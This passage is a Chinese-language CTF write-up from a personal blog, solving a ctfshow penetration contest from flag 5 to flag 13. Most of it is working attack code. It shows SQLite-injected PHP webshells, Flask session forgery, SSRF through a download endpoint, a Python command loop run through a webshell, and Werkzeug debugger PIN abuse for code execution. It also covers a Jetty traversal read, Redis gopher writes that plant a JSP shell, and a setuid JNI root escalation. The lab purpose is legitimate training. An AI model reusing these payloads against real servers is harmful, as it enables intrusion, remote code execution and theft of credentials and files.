+<h3 id="flag5-文件读取-root账户-app-py-bak（含密码"><a href="#flag5-文件读取-root账户-app-py-bak（含密码" class="headerlink" title="flag5-文件读取+root账户+app.py.bak（含密码"></a>flag5-文件读取+root账户+app.py.bak（含密码</h3><p>拿新的身份去查看新的admin功能，抓个包,一个是遍历文件，一个是查看文件</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250112211547417.png?raw=true" alt="image-20250112211547417"></p>
+<p>访问init_users.json获得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;7y.(sc#Ac_&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag6-ssrf-secret-key"><a href="#flag6-ssrf-secret-key" class="headerlink" title="flag6-ssrf+secret_key"></a>flag6-ssrf+secret_key</h3><p>在<code>Server Info</code>菜单发现内网IP地址</p>
+<p>有个download task file的页面可以试试内网访问</p>
+<p>ctfshow{0x8F7C71E8E82E4D1E}</p>
+<h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="flag7-ssrf传码-获取shell"><a href="#flag7-ssrf传码-获取shell" class="headerlink" title="flag7-ssrf传码,获取shell"></a>flag7-ssrf传码,获取shell</h3><p>sqllite写码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?dsn=sqlite:shell.php&amp;username=aaa&amp;password=bbb&amp;query=create table &quot;aaa&quot;(name TEXT DEFAULT &quot;&lt;?php file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;);?&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>没好使，用的下边的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.198.5/?username=1%26password=1%26query=CREATE TABLE users (name TEXT);%26dsn=sqlite:b.php</span><br><span class="line">http://172.2.198.5/?username=1%26password=1%26query=INSERT INTO users (name) VALUES (&#x27;&lt;?php file_put_contents(&quot;4.php&quot;,&quot;&lt;?php system(\$_GET[0]);?&gt;&quot;);?&gt;&#x27;);%26dsn=sqlite:b.php</span><br><span class="line">http://172.2.198.5/b.php</span><br><span class="line">http://172.2.198.5/4.php?0=ls;</span><br><span class="line">http://172.2.198.5/4.php?0=cat config.php;</span><br></pre></td></tr></table></figure>
+
+<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>原内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3fdsn=sqlite:shell.php%26username=aaa%26password=bbb%26query=create%20table%20&quot;aaa&quot;%20(name%20TEXT%20DEFAULT%20&quot;&lt;?php%20file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;);?&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.198.5/%3fdsn=sqlite:shell.php%26username=bbb%26password=bbb%26query=create%20table%20%22bbb%22%20(name%20TEXT%20DEFAULT%20%22%3C?php%20file_put_contents(%271.php%27,%27%3C?php%20eval($_GET[1]);?%3E%27);?%3E%22);</span><br></pre></td></tr></table></figure>
+
+<p>再访问shell.php然后虽然报错但是码写进去了，然后去1.php</p>
+<h3 id="flag8-眼看"><a href="#flag8-眼看" class="headerlink" title="flag8-眼看"></a>flag8-眼看</h3><p>根目录有个secret.txt打开，里面有邮箱账号+密码的base64</p>
+<ul>
+<li><a href="mailto:&#104;&#97;&#99;&#107;&#x65;&#114;&#x5f;&#x63;&#x74;&#102;&#x73;&#104;&#111;&#x77;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#x6d;">&#104;&#97;&#99;&#107;&#x65;&#114;&#x5f;&#x63;&#x74;&#102;&#x73;&#104;&#111;&#x77;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#x6d;</a>&#x2F;H</li>
+<li>acker_ctfsh0w</li>
+</ul>
+<p>网易邮箱登录可以看到<strong>81192</strong></p>
+<h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><h3 id="flag9-session伪造-ssrf-key"><a href="#flag9-session伪造-ssrf-key" class="headerlink" title="flag9-session伪造-ssrf+key"></a>flag9-session伪造-ssrf+key</h3><p>打.6:8888进去就会给个session，访问&#x2F;key会拒绝，伪造一个</p>
+<p>根据flag5那的py.bak源代码里的伪造一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s 3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5 -c eyJ1c2VyIjoiZ3Vlc3QifQ.Z4dF3w.FEE9qzWhV0dbFQ-ZNfYo7eqpr6o</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s 3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5 -t &quot;&#123;&#x27;user&#x27;: &#x27;admin&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VyIjoiYWRtaW4ifQ.Z4dItA.yrEFxBrghAW5vMoONE3fPUzMHAY</span><br></pre></td></tr></table></figure>
+
+<p>在通过刚才获取的shell去ssrf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.198.5/4.php?0=curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z4dItA.yrEFxBrghAW5vMoONE3fPUzMHAY&quot; &quot;http://172.2.198.6:8888/key&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag10-flask日志文件getshell"><a href="#flag10-flask日志文件getshell" class="headerlink" title="flag10-flask日志文件getshell"></a>flag10-flask日志文件getshell</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul>
+<li>查看werkzeug的源码<ul>
+<li>werkzeug是Python实现的WSGI规范的使用函数库。</li>
+<li>WSGI是一种服务器和客户端交互的接口规范</li>
+</ul>
+</li>
+<li>curl<ul>
+<li><strong><code>-v</code></strong> 选项启用了 <strong>详细模式</strong></li>
+<li>**<code>-c cookie.txt</code>**：<ul>
+<li>这个选项指定 <strong>curl</strong> 在完成请求后，将从服务器返回的 Cookies 保存到 <code>cookie.txt</code> 文件中。</li>
+</ul>
+</li>
+<li>**<code>-b</code>**：<ul>
+<li>这个选项用来指定 <strong>curl</strong> 发送请求时使用 <strong>指定的 Cookie</strong> 文件。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><h5 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h5><p>附上脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    data = input(&quot;&gt; &quot;)</span><br><span class="line">    # data = urllib.parse.quote(data)</span><br><span class="line">    # python_shell = &#x27;curl --cookie &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk;__wzd2fb5743f98b45463400e=1736152460|4bfc86e353c8&quot; &quot;http://172.2.252.6:8888/console?__debugger__=yes&amp;s=eABh7cMeNgMKri1DSi4w&amp;cmd=&#123;&#125;&amp;frm=1&quot;&#x27;.format(data)</span><br><span class="line">    # python_shell = base64.b64encode(python_shell.encode()).decode()</span><br><span class="line">    data = base64.b64encode(data.encode()).decode()</span><br><span class="line">    # normal_shell = &#x27;echo &quot;&#x27; + data + &#x27;&quot; | base64 -d | sh&#x27;</span><br><span class="line">    normal_shell=data</span><br><span class="line">    # url = &quot;https://543f943e-6f90-43b4-bfc8-ee86d2fb3f34.challenge.ctf.show/downloadTaskFile?url=http://172.2.239.5/1.php?1=phpinfo();&quot;</span><br><span class="line">    url = &quot;http://6bcb3e8b-f3e3-4103-86b7-e8d9a9df8f92.challenge.ctf.show/downloadTaskFile?url=http://172.2.198.5/1.php?1=system(base64_decode(\&quot;&quot;+normal_shell+&quot;\&quot;));&quot;</span><br><span class="line">    response = requests.get(url, verify=False, headers=&#123;&#x27;Authorization&#x27;: &quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNzAwNTIwOH0.6I2CU7u2c96zkz_HhdEg2NvuvwdvLSsAjfIom3b80Jw&quot;&#125;)</span><br><span class="line">    try:</span><br><span class="line">        # print(url)</span><br><span class="line">        # print(response.json())</span><br><span class="line">        # print(response.json()[&quot;url&quot;])</span><br><span class="line">        print(response.json()[&quot;file_content&quot;])</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;Error&quot;)</span><br><span class="line">        continue</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>修改日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/set_log_option%3flogName=werkzeug%2526logFile=main.log</span><br></pre></td></tr></table></figure>
+
+<p>获取console的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/console</span><br><span class="line"></span><br><span class="line">21hr1yWBaAg5kQrHGHW</span><br></pre></td></tr></table></figure>
+
+<p>写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z4dItA.yrEFxBrghAW5vMoONE3fPUzMHAY&quot; &quot;http://172.2.198.6:8888/set_log_option?__debugger__=yes&amp;cmd=printpin&amp;f=console.png&amp;s=21hr1yWBaAg5kQrHGHWl&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.198.5/4.php?0=curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z4dItA.yrEFxBrghAW5vMoONE3fPUzMHAY&quot; &quot;http://172.2.198.6:8888/get_log_content?logFile=main.log&quot;</span><br></pre></td></tr></table></figure>
+
+<p>获取pin码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/set_log_option?__debugger__=yes&amp;cmd=printpin&amp;f=console.png&amp;s=21hr1yWBaAg5kQrHGHWl</span><br><span class="line">143-535-858</span><br></pre></td></tr></table></figure>
+
+<p>验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z4dItA.yrEFxBrghAW5vMoONE3fPUzMHAY&quot; &quot;http://172.2.198.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=143-535-858&amp;s=21hr1yWBaAg5kQrHGHWl&quot;</span><br></pre></td></tr></table></figure>
+
+<p>保存cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -v -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z4dItA.yrEFxBrghAW5vMoONE3fPUzMHAY&quot; &quot;http://172.2.198.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=143-535-858&amp;s=21hr1yWBaAg5kQrHGHWl&quot;</span><br></pre></td></tr></table></figure>
+
+<p>利用cookie命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -b  &quot;__wzd805bda8603787a1242cd=1736926402|12a32c978a26&quot; &quot;http://172.2.198.6:8888/console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).system(&#x27;&#x27;&#x27;cat%20\/etc\/passwd&gt;.\/log\/main2.log&#x27;&#x27;&#x27;)&amp;frm=0&amp;s=21hr1yWBaAg5kQrHGHWl&quot;</span><br></pre></td></tr></table></figure>
+
+<p>没写进去，换shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.198.5/1.php?1=system(base64_decode(&#x27;Y3VybCAgLXYgLWIgICJfX3d6ZDgwNWJkYTg2MDM3ODdhMTI0MmNkPTE3MzY5MjY0MDJ8MTJhMzJjOTc4YTI2IiAiaHR0cDovLzE3Mi4yLjE5OC42Ojg4ODgvY29uc29sZT9fX2RlYnVnZ2VyX189eWVzJmNtZD1vcy5zeXN0ZW0oJycnY2F0JTIwXC9ldGNcL3Bhc3N3ZD4uXC9sb2dcL21haW4yLmxvZycnJykmZnJtPTAmcz0yMWhyMXlXQmFBZzVrUXJIR0hXbCI=&#x27;));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.198.5/4.php?0=curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z4dItA.yrEFxBrghAW5vMoONE3fPUzMHAY&quot; &quot;http://172.2.198.6:8888/get_log_content?logFile=main2.log&quot;</span><br></pre></td></tr></table></figure>
+
+<p>读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.198.5/4.php?0=curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z4dItA.yrEFxBrghAW5vMoONE3fPUzMHAY&quot; &quot;http://172.2.198.6:8888/get_log_content?logFile=main.log&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z4dItA.yrEFxBrghAW5vMoONE3fPUzMHAY&quot; &quot;http://172.2.198.6:8888/get_log_content?logFile=main.log&quot;</span><br></pre></td></tr></table></figure>
+
+<p>直接读</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -b  &quot;__wzd805bda8603787a1242cd=1736926402|12a32c978a26&quot; &quot;http://172.2.198.6:8888/console?__debugger__=yes&amp;cmd=print(__import__(&#x27;os&#x27;).popen(&#x27;cat%20\/etc\/passwd&#x27;).read())&amp;frm=0&amp;s=21hr1yWBaAg5kQrHGHWl&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><h3 id="flag11"><a href="#flag11" class="headerlink" title="flag11"></a>flag11</h3><p>直接访问7的8080端口，是Jetty Server</p>
+<ol>
+<li><p>敏感文件读取</p>
+<ul>
+<li><pre><code>curl  -v  &quot;http://172.2.198.7:8080/%u002e/WEB-INF/web.xml&quot;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   - 直接读出来了</span><br><span class="line"></span><br><span class="line">### flag12</span><br><span class="line"></span><br><span class="line">1. 先上号</span><br><span class="line"></span><br><span class="line">   1. ```</span><br><span class="line">      http://172.2.182.5/1.php?1=system(base64_decode(&#x27;Y3VybCAgLXYgICJkaWN0Oi8vMTcyLjIuMTgyLjc6NjM4MC9hdXRoOmN0ZnNob3dfMjAyNSI=&#x27;));</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<ol start="2">
+<li><pre><code>curl  -v  &quot;dict://172.2.182.7:6380/auth:ctfshow_2025&quot;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 再传码</span><br><span class="line"></span><br><span class="line">   1. ```</span><br><span class="line">      http://172.2.182.5/1.php?1=system(base64_decode(&#x27;Y3VybCAgLXYgICJnb3BoZXI6Ly8xNzIuMi4xODIuNzo2MzgwL19hdXRoJTIwY3Rmc2hvd18yMDI1JTBBc2V0JTIwbWFycyUyMCUyMiUzQyUyNSUyMFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3JTIwU3RyaW5nJTVCJTVEJTdCJTVDJTIyc2glNUMlMjIlMkMlNUMlMjItYyU1QyUyMiUyQ3JlcXVlc3QuZ2V0UGFyYW1ldGVyKCU1QyUyMmNtZCU1QyUyMiklN0QpJTNCJTI1JTNFJTIyJTBBY29uZmlnJTIwc2V0JTIwZGlyJTIwJTJGb3B0JTJGamV0dHklMkZ3ZWJhcHBzJTJGUk9PVCUyRiUwQWNvbmZpZyUyMHNldCUyMGRiZmlsZW5hbWUlMjAyLmpzcCUwQXNhdmUlMEFxdWl0Ig==&#x27;));</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+</li>
+<li><p>读取文件</p>
+<ol>
+<li><p>发现命令没有回显，写入web服务目录&#x2F;opt&#x2F;jetty&#x2F;webapps&#x2F;ROOT&#x2F;</p>
+</li>
+<li><pre><code>2.jsp?cmd=ls%20/&gt;/opt/jetty/webapps/ROOT/success.txt
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. ```</span><br><span class="line">   2.jsp?cmd=cat%20/dylan.txt&gt;/opt/jetty/webapps/ROOT/success.txt</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="flag13"><a href="#flag13" class="headerlink" title="flag13"></a>flag13</h3><ol>
+<li><p>查询cap权限</p>
+<ol>
+<li><pre><code>getcap%20-r%20/%202&gt;/dev/null&gt;/opt/jetty/webapps/ROOT/success.txt
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   /usr/local/openjdk-8/bin/java = cap_setuid+ep</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+</li>
+<li><p>setuid提权</p>
+</li>
+<li><p>写setuid.c</p>
+<ol>
+<li><pre><code>2.jsp?cmd=echo%20&quot;I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9&quot;%20|base64%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.c
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```C</span><br><span class="line">   #include &lt;jni.h&gt;</span><br><span class="line">   #include &lt;unistd.h&gt;</span><br><span class="line">   </span><br><span class="line">   JNIEXPORT jint JNICALL Java_SetUID_setUID(JNIEnv *env, jobject obj, jint uid) &#123;</span><br><span class="line">       return setuid(uid);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+</li>
+<li><p>setuid.java</p>
+<ol>
+<li><pre><code>2.jsp?cmd=echo%20&quot;cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ==&quot;%20|base64%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.java
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   public class SetUID &#123;</span><br><span class="line">       static &#123;</span><br><span class="line">           System.loadLibrary(&quot;SetUID&quot;); </span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       public native int setUID(int uid); </span><br><span class="line">   </span><br><span class="line">       public static void main(String[] args) throws Exception &#123;</span><br><span class="line">           SetUID setUID = new SetUID();</span><br><span class="line">           int result = setUID.setUID(0); </span><br><span class="line">           Runtime.getRuntime.exec(new String[]&#123;&quot;sh&quot;,&quot;-c&quot;,&quot;cat /root/*.txt&gt;/opt/jetty/webapps/ROOT/root.txt&quot;&#125;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+</li>
+<li><p>编译</p>
+<ol>
+<li><pre><code>2.jsp?cmd=javac%20/opt/jetty/webapps/ROOT/SetUID.java
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```Python</span><br><span class="line">   2.jsp?cmd=gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I$&#123;JAVA_HOME&#125;/include%20-I$&#123;JAVA_HOME&#125;/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+</li>
+<li><p>执行</p>
+<ol>
+<li><pre><code>2.jsp?cmd=java%20-Djava.library.path=/opt/jetty/webapps/ROOT/%20-cp%20/opt/jetty/webapps/ROOT/%20SetUID
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">## 参考</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://chenxi9981.github.io/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/">https://chenxi9981.github.io/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/">https://www.cnblogs.com/LAMENTXU/articles/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh">https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh</a></p>
+<pre><code>
+## 评价
+
+挺难的，感觉我自己做不能出，
+
+疑惑点是flag10这，还有flag13这，13是真不会，记住payload下回直接用了
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/">http://example.com/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/5wp/">5wp</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024第一场ciscn-ctfshow复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">2024第一场ciscn-ctfshow复现</div></div><div class="info-2"><div class="info-item-1">2024ciscn第一场本章内容均在ctfshow复现 sanicpython污染 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute:    def __init__(self):        passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request):...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/12/08/2024polar-winter/" title="2024polar-winter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-08</div><div class="info-item-2">2024polar-winter</div></div><div class="info-2"><div class="info-item-1">2024polarctf-web冬季个人挑战赛【WEB】xxmmll这个是先bp发个包，响应的有个php文件，进去之后有个输入框 1  【WEB】赌王 –没做出来直接发空爆破 你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件  进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20  存在xss漏洞但是没东西 数字unicode绕过+科学计数法+全字符绕过   不好使，好像是没被解析 复现123&lt;script&gt;confirm(1);&lt;/script&gt;按提示去xss;提示如下↓就c你o还n想f弹i窗r,m  给出另一个文件php,然后网页源代码有提示，伪造本地IP；然后去命令执行  【WEB】狗黑子的RCEps看进程，里面没事，env看环境变量，有个假flag   打开文件使用函数替换 rev strings  查看目录文件使用函数替换 find &#x2F;       **find**列出目录及其子目录中的文件。 出flag.php   du &#x2F;       ...</div></div></div></a><a class="pagination-related" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" 